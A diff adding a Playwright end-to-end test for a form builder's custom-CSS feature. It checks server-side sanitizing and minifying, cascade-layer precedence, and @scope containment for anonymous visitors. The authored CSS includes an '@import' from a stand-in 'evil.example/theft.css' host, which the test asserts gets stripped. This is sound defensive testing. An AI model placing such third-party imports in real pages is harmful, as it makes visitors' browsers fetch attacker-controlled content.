@@ -23,6 +23,7 @@ const setOptionLabels = async (page: Page, labels: string[]) => {
 const FORM_TARGET_TABLE = 'https://atomicdata.dev/properties/form-target-table';
 const FORM_PUBLISHED_AT = 'https://atomicdata.dev/properties/form-published-at';
 const FORM_STYLING = 'https://atomicdata.dev/properties/form-styling';
+const FORM_CUSTOM_CSS = 'https://atomicdata.dev/properties/form-custom-css';
 
 /**
  * GET the published definition of `subject` from inside the browser.
@@ -1143,6 +1144,125 @@ test.describe('form publish and anonymous submit', () => {
     await expect(
       visitorPage.getByRole('heading', { name: 'Scheduled form' }),
     ).toBeVisible({ timeout: 15000 });
+
+    await visitorContext.close();
+  });
+
+  /**
+   * The one link in the custom-CSS chain that unit tests cannot reach: an
+   * anonymous visitor on the real `/form/:id` route, with the CSS the server
+   * actually served.
+   *
+   * The load-bearing assertion is the `h1` one. `h1` is specificity 0-0-1 and
+   * the renderer's own `.atomic-form-title { color: … }` is 0-1-0, so under
+   * plain cascade rules the owner would lose. They win because
+   * `atomic-form-custom` is a later cascade layer than `atomic-form-base`,
+   * which is the entire promise of the feature — an owner never has to
+   * out-specify us, and we stay free to change our selectors. If this
+   * assertion ever fails while the others pass, the layering broke, not the
+   * plumbing.
+   */
+  test('a published form carries the owner\'s custom CSS', async ({
+    page,
+    browser,
+  }) => {
+    await newResource('form', page);
+    await page.getByPlaceholder('New Form').fill('Themed form');
+    await page.locator('dialog[open] button:has-text("Create")').click();
+    await page.waitForURL(url => url.pathname.startsWith('/app/show'), {
+      timeout: 15000,
+    });
+
+    const formSubject = await page.evaluate(() => {
+      const main = document.querySelector('main[about]');
+
+      return main?.getAttribute('about') ?? '';
+    });
+    expect(formSubject).toBeTruthy();
+
+    await page.getByTitle('Add field').click();
+    await page.getByRole('menuitem', { name: 'Email', exact: true }).click();
+    await expect(page.getByTestId('field-row-email')).toBeVisible();
+
+    // --- Write custom CSS in the builder ---
+    await page.getByRole('tab', { name: 'Settings' }).click();
+    await page.getByText('Custom CSS', { exact: true }).click();
+
+    const editor = page.locator('.cm-content');
+    await expect(editor).toBeVisible({ timeout: 15000 });
+
+    // `fill` on a contenteditable inserts the text in one input event, so
+    // CodeMirror's bracket auto-closing never fires and the braces stay as
+    // written. Typing this key-by-key would produce doubled `}`s.
+    const authoredCss = [
+      // Stripped server-side: it would make every visitor's browser fetch
+      // from a third-party host on page load.
+      '@import url("https://evil.example/theft.css");',
+      '/* minified away on the way out */',
+      ':scope { --atomic-form-accent: rgb(0, 200, 100); }',
+      'h1 { color: rgb(200, 0, 50); }',
+      // Never applies: `body` is not inside the `@scope` root, so this is
+      // the probe for CSS escaping the form.
+      'body { outline: 5px solid rgb(1, 2, 3); }',
+    ].join('\n');
+    await editor.fill(authoredCss);
+
+    // The editor commits on a 500ms debounce (and flushes on unmount).
+    await page.waitForFunction(
+      ({ subject, prop }) =>
+        (window.store.resources.get(subject)?.get(prop) as string)?.includes(
+          'rgb(200, 0, 50)',
+        ),
+      { subject: formSubject, prop: FORM_CUSTOM_CSS },
+      { timeout: 15000 },
+    );
+    await waitForOutboxDrained(page);
+
+    // --- Publish ---
+    await page.getByRole('button', { name: 'Publish', exact: true }).click();
+    await expect(page.getByRole('button', { name: 'Unpublish' })).toBeVisible();
+    await waitForOutboxDrained(page);
+    await waitForPublished(page, formSubject);
+
+    // --- The server sanitized and minified it on the way out ---
+    const definition = await fetchDefinition(page, formSubject);
+    expect(definition.ok).toBe(true);
+    expect(definition.body).not.toContain('@import');
+    expect(definition.body).not.toContain('evil.example');
+    expect(definition.body).not.toContain('minified away');
+    // `h1{color:` — no space — is both "the rule survived" and "it was
+    // minified". Deliberately not asserting the colour's spelling:
+    // lightningcss rewrites `rgb(200, 0, 50)` to `#c80032`, and which
+    // shorter form it picks is its business, not this test's. The computed
+    // styles below are what actually pin the values.
+    expect(definition.body).toContain('h1{color:');
+    expect(definition.body).toContain('--atomic-form-accent');
+
+    // --- And an anonymous visitor renders with it applied ---
+    const visitorContext = await browser.newContext();
+    const visitorPage = await visitorContext.newPage();
+    const response = await visitorPage.goto(
+      `${SERVER_URL}/form/${formSubject}`,
+    );
+    expect(response?.status()).toBe(200);
+
+    const title = visitorPage.locator('h1.atomic-form-title');
+    await expect(title).toBeVisible({ timeout: 15000 });
+
+    // Layer beats specificity: a bare `h1` overrides `.atomic-form-title`.
+    await expect(title).toHaveCSS('color', 'rgb(200, 0, 50)');
+
+    // `:scope` reached the form root, so the accent variable re-themed the
+    // submit button the renderer paints with it.
+    await expect(
+      visitorPage.getByRole('button', { name: 'Submit' }),
+    ).toHaveCSS('background-color', 'rgb(0, 200, 100)');
+
+    // `@scope` contained it: the `body` rule matched nothing.
+    await expect(visitorPage.locator('body')).not.toHaveCSS(
+      'outline-color',
+      'rgb(1, 2, 3)',
+    );
 
     await visitorContext.close();
   });
